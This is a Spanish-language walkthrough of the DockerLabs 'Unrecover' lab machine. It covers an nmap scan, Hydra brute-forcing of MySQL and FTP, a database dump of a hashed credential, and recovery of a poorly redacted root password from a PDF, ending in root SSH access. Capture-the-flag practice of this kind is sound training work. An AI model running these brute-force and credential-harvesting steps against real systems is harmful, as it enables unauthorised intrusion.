---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Unrecover DockerLabs (Intermediate)

### Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip unrecover.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh unrecover.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

### Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-03 04:18 EST
Nmap scan report for 172.17.0.2
Host is up (0.000034s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)
| ssh-hostkey: 
|   256 04:81:76:01:7f:ac:bd:15:ea:2b:24:10:c2:7c:56:5f (ECDSA)
|_  256 73:c2:da:cb:47:d7:a9:40:1e:c6:11:bf:09:9c:b2:a3 (ED25519)
80/tcp   open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: Zoo de Capybaras
|_http-server-header: Apache/2.4.62 (Debian)
3306/tcp open  mysql   MySQL 5.5.5-10.11.6-MariaDB-0+deb12u1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.11.6-MariaDB-0+deb12u1
|   Thread ID: 35
|   Capabilities flags: 63486
|   Some Capabilities: Support41Auth, Speaks41ProtocolOld, SupportsCompression, InteractiveClient, ODBCClient, ConnectWithDatabase, DontAllowDatabaseTableColumn, SupportsTransactions, IgnoreSigpipes, Speaks41ProtocolNew, FoundRows, IgnoreSpaceBeforeParenthesis, SupportsLoadDataLocal, LongColumnFlag, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: .qp]cWj0LppbwRtnNw0%
|_  Auth Plugin Name: mysql_native_password
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.26 seconds
```

Vemos varios puertos interesantes, pero ninguno tiene acceso con unas credenciales por defecto, por lo que investigando la pagina del puerto `80` vemos la siguiente frase.

```
Hola Usuario capybara
```

Podemos ver que obtuvimos un usuario llamado `capybara` por lo que podremos probar diferentes sitios de realizar fuerza bruta, pero el unico que ha funcionado fue en `mysql`.

## Hydra

```shell
hydra -l capybara -P <WORDLIST> mysql://<IP> -t 64 -I
```

Info:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-03 04:24:04
[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking mysql://172.17.0.2:3306/
[3306][mysql] host: 172.17.0.2   login: capybara   password: password1
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-03 04:24:07
```

Por lo que vemos obtenemos las credenciales de `mysql`, por lo que nos conectaremos a el.

## MySQL

```shell
mysql -h <IP> -u capybara -ppassword1 --ssl=0
```

Vamos a ver que bases de datos hay:

```mysql
show databases;
```

Info:

```
+--------------------+
| Database           |
+--------------------+
| beta               |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.001 sec)
```

Viendo esto, vamos a ver que tablas contiene la base de datos `beta`.

```mysql
use beta;
show tables;
```

Info:

```
+----------------+
| Tables_in_beta |
+----------------+
| registraton    |
+----------------+
1 row in set (0.001 sec)
```

Vemos que contiene una tabla `registraton` por lo que vamos a ver que contiene dentro de la misma:

```mysql
select * from registraton;
```

Info:

```
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | balulero | 520d3142a140addb8be7d858a7e29e15 |
+----+----------+----------------------------------+
1 row in set (0.000 sec)
```

Vemos que tenemos unas credenciales, pero la contraseña esta en formato `hash` por lo que vamos a intentar `crackearla`.

Pero veremos que no se puede, por lo que vamos a intentar lanzar un `hydra` contra el `FTP` con ese usuario que encontramos.

## Escalate user root

### Hydra (balulero)

```shell
hydra -l balulero -P <WORDLIST> ftp://<IP> -t 64 -I
```

Info:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-03 04:40:47
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ftp://172.17.0.2:21/
[21][ftp] host: 172.17.0.2   login: balulero   password: password1
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-03 04:40:54
```

Vemos que obtuvimos unas credenciales, por lo que nos conectaremos por el `ftp` de la siguiente forma:

### FTP

```shell
ftp balulero@<IP>
```

Metemos como contraseña `password1` y veremos que estamos dentro.

Una vez dentro si listamos veremos lo siguiente:

```
229 Entering Extended Passive Mode (|||7002|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0           31654 Feb 02 11:21 backup.pdf
226 Directory send OK.
```

Vemos que hay un archivo `.pdf` que parece ser un `backup` de algo, vamos a descargarnoslo:

```shell
get backup.pdf
```

Una vez en nuestro `host` si abrimos el `PDF` veremos lo siguiente:

<figure><img src="../../.gitbook/assets/image (183) (1).png" alt=""><figcaption></figcaption></figure>

Vemos que la contraseña esta censurada pero si intentamos leerla se puede leer algo ya que es medio legible y parece que pone `passwordpepinaca`, para el usuario `root`.

### SSH

Ahora si probamos a conectarnos mediante `ssh` con dichas credenciales que hemos encontrado.

```shell
ssh root@<IP>
```

Info:

```
Linux 767e54ffd0e8 6.8.11-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.8.11-1kali2 (2024-05-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Feb  2 11:37:48 2025 from 172.17.0.1
root@767e54ffd0e8:~# whoami
root
```

Metemos como contraseña `passwordpepinaca` y veremos que estamos dentro con dicho usuario, pero en este caso ya seremos `root` por lo que habremos terminado la maquina.
